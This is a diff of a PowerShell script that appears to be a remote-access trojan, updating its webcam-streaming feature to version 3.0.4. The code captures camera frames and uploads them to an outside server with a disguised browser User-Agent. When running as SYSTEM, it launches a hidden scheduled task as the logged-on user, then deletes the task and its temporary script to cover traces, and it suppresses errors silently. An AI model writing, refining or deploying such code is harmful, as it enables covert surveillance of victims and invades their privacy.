@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.3"
+$Version = "3.0.4"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -327,7 +327,6 @@ $script:cameraTask = $null
 function Send-CameraFrame {
     param([byte[]]$FrameData)
     try {
-        # Send raw JPEG bytes (not base64) to match server expectation
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("User-Agent", "Mozilla/5.0")
         $wc.UploadData("$cfHost/camera_frame?id=$clientId", "POST", $FrameData) | Out-Null
@@ -335,10 +334,38 @@ function Send-CameraFrame {
     } catch { }  # Silent drop, don't crash runspace
 }
 
+# Helper: synchronously await a WinRT IAsyncOperation / IAsyncAction
+function Invoke-WinRTAsync {
+    param($AsyncOp)
+    $task = [System.WindowsRuntimeSystemExtensions]::AsTask($AsyncOp)
+    $task.Wait()
+    if ($task.IsFaulted) { throw $task.Exception.InnerException }
+    return $task.Result
+}
+
+# Read all bytes from a WinRT IRandomAccessStream into a byte array
+function Read-RASBytes {
+    param($Stream)
+    $Stream.Seek(0)
+    $reader = [Windows.Storage.Streams.DataReader]::new($Stream)
+    $size = [uint32]$Stream.Size
+    Invoke-WinRTAsync($reader.LoadAsync($size)) | Out-Null
+    $bytes = [byte[]]::new($size)
+    $reader.ReadBytes($bytes)
+    $reader.Dispose()
+    return $bytes
+}
+
 function Start-CameraStream {
     param([int]$Quality = 50)
-    
+
     try {
+    # Load required WinRT types and async bridge
+    [void][Windows.Media.Capture.MediaCapture,          Windows.Media.Capture,          ContentType=WindowsRuntime]
+    [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
+    [void][Windows.Storage.Streams.DataReader,          Windows.Storage.Streams,        ContentType=WindowsRuntime]
+    [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
+    Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
 
     # Find logged-on user (needed for SYSTEM account to access camera)
     $loggedOnUser = $null
@@ -348,77 +375,67 @@ function Start-CameraStream {
         try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
     }
 
-    # Check if running as SYSTEM
     $isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
 
     if ($isSystem -and $loggedOnUser) {
-        # SYSTEM needs to launch camera as logged-in user via scheduled task
-        
+        # SYSTEM path: launch capture as the logged-on user via a scheduled task
         $taskId = "CameraStream_$(Get-Random)"
         $cameraScript = @"
-`$ErrorActionPreference = "Stop"
-Add-Type -AssemblyName "System.Drawing"
+`$ErrorActionPreference = 'Stop'
+[void][Windows.Media.Capture.MediaCapture,          Windows.Media.Capture,          ContentType=WindowsRuntime]
+[void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
+[void][Windows.Storage.Streams.DataReader,          Windows.Storage.Streams,        ContentType=WindowsRuntime]
+[void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
+Add-Type -AssemblyName System.Runtime.WindowsRuntime
 
-`$device = New-Object Windows.Media.Capture.MediaCapture
-`$device.InitializeAsync() | Out-Null
-Start-Sleep -Seconds 1
+function Await { param(`$op); `$t = [System.WindowsRuntimeSystemExtensions]::AsTask(`$op); `$t.Wait(); if (`$t.IsFaulted) { throw `$t.Exception.InnerException }; return `$t.Result }
 
-`$ms = New-Object System.IO.MemoryStream
-`$encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { `$_.MimeType -eq "image/jpeg" }
-`$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
-`$encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $Quality)
+`$serverUrl = '$cfHost'
+`$cid = '$clientId'
+function Send-Frame { param([byte[]]`$data); try { `$wc = New-Object System.Net.WebClient; `$wc.Headers.Add('User-Agent','Mozilla/5.0'); `$wc.UploadData("`$serverUrl/camera_frame?id=`$cid",'POST',`$data) | Out-Null; `$wc.Dispose() } catch {} }
 
-`$serverUrl = "$cfHost"
-`$cid = "$clientId"
-
-function Send-Frame {
-    param([byte[]]`$data)
-    try {
-        `$wc = New-Object System.Net.WebClient
-        `$wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        `$wc.UploadData("`$serverUrl/camera_frame?id=`$cid", "POST", `$data)
-    } catch {}
-}
+`$device = [Windows.Media.Capture.MediaCapture]::new()
+Await(`$device.InitializeAsync()) | Out-Null
+`$enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
 
 while (`$true) {
     try {
-        `$device.CapturePhotoToStreamAsync(`$ms) | Out-Null
-        `$ms.Position = 0
-        Send-Frame -data `$ms.ToArray()
-        `$ms.SetLength(0)
+        `$ras = [Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
+        Await(`$device.CapturePhotoToStreamAsync(`$enc, `$ras)) | Out-Null
+        `$ras.Seek(0)
+        `$reader = [Windows.Storage.Streams.DataReader]::new(`$ras)
+        Await(`$reader.LoadAsync([uint32]`$ras.Size)) | Out-Null
+        `$bytes = [byte[]]::new(`$ras.Size)
+        `$reader.ReadBytes(`$bytes)
+        `$reader.Dispose(); `$ras.Dispose()
+        Send-Frame -data `$bytes
     } catch { break }
     Start-Sleep -Milliseconds 100
 }
 "@
-        
         $scriptPath = Join-Path $env:TEMP "camera_stream_$taskId.ps1"
         $cameraScript | Out-File -FilePath $scriptPath -Encoding UTF8
 
-        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File `"$scriptPath`""
+        $action   = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -NonInteractive -File `"$scriptPath`""
         $principal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 
         Register-ScheduledTask -TaskName $taskId -Action $action -Principal $principal -Settings $settings -Force | Out-Null
         Start-ScheduledTask -TaskName $taskId
-
-        # Wait for streaming to start
         Start-Sleep -Seconds 2
 
-        # Monitor until stopped
+        # Monitor until stopstream signal or task exits
         while ($sharedState.CameraRunning) {
-            $taskInfo = Get-ScheduledTaskInfo -TaskName $taskId -ErrorAction SilentlyContinue
-            if ($taskInfo -and $taskInfo.State -eq 'Stopped') {
-                break
-            }
+            $task = Get-ScheduledTask -TaskName $taskId -ErrorAction SilentlyContinue
+            if (-not $task -or $task.State -ne 'Running') { break }
             Start-Sleep -Seconds 5
         }
 
         # Cleanup
-        Stop-ScheduledTask -TaskName $taskId -ErrorAction SilentlyContinue | Out-Null
+        Stop-ScheduledTask   -TaskName $taskId -ErrorAction SilentlyContinue | Out-Null
         Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
         Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
-        
-        # If the task died but we didn't type stopstream, notify server it crashed
+
         if ($sharedState.CameraRunning) {
             try {
                 $wc = New-Object System.Net.WebClient
@@ -428,42 +445,27 @@ while (`$true) {
         }
     }
     else {
-        # Running as normal user - direct camera access
+        # Normal user path: capture directly in this runspace
         try {
-            Add-Type -AssemblyName "System.Drawing"
-            
-            $device = New-Object Windows.Media.Capture.MediaCapture
-            $device.InitializeAsync() | Out-Null
-            Start-Sleep -Seconds 1
-
-            $ms = New-Object System.IO.MemoryStream
-            $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
-                       Where-Object { $_.MimeType -eq "image/jpeg" }
-            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
-            $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter(
-                [System.Drawing.Imaging.Encoder]::Quality, $Quality)
+            $device = [Windows.Media.Capture.MediaCapture]::new()
+            Invoke-WinRTAsync($device.InitializeAsync()) | Out-Null
+            $enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
 
             while ($sharedState.CameraRunning) {
                 try {
-                    $device.CapturePhotoToStreamAsync($ms) | Out-Null
-                    $ms.Position = 0
-                    $frameBytes = $ms.ToArray()
+                    $ras = [Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
+                    Invoke-WinRTAsync($device.CapturePhotoToStreamAsync($enc, $ras)) | Out-Null
+                    $frameBytes = Read-RASBytes -Stream $ras
+                    $ras.Dispose()
                     Send-CameraFrame -FrameData $frameBytes
-                    $ms.SetLength(0)
-                } catch {
-                    break
-                }
+                } catch { break }
                 Start-Sleep -Milliseconds 100
             }
-
             $device.Dispose()
-            $ms.Dispose()
         }
         catch {
-            # Silent fail in runspace, but log if logFile is available
             if ($logFile) {
-                $msg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [WARN] Camera init failed: $($_.Exception.Message)"
-                Add-Content -Path $logFile -Value $msg -ErrorAction SilentlyContinue
+                Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [WARN] Camera failed: $($_.Exception.Message)" -ErrorAction SilentlyContinue
             }
             try {
                 $wc = New-Object System.Net.WebClient
